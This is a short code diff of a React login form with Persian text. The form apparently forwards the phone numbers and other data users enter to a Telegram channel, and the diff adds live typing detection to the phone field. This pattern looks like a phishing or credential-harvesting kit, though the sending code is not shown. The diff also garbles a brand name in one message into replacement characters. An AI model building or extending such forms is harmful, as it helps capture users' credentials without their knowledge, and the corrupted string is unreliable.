@@ -883,7 +883,7 @@ export const LoginForm = () => {
                   <AlertMessage>
                     {!validateTelegramConfig()
                       ? "🎭 حالت دمو: اطلاعات به کنسول ارسال می‌شود. برای فعال‌سازی تلگرام، فایل .env را تنظیم کنید."
-                      : "🤖 بات تلگرام فعال: اطلاعات به کانال والکس ارسال خواهد شد."}
+                      : "🤖 بات تلگرام فعال: اطلاعات به کانال ��الکس ارسال خواهد شد."}
                   </AlertMessage>
                 </div>
               </div>
@@ -956,6 +956,7 @@ export const LoginForm = () => {
                       maxLength={11}
                       value={toPersianDigits(mobileNumber)}
                       onChange={handleMobileNumberChange}
+                      {...typingDetection.createTypingHandler("phone")}
                       autoFocus
                       disabled={isSubmitting}
                       style={{
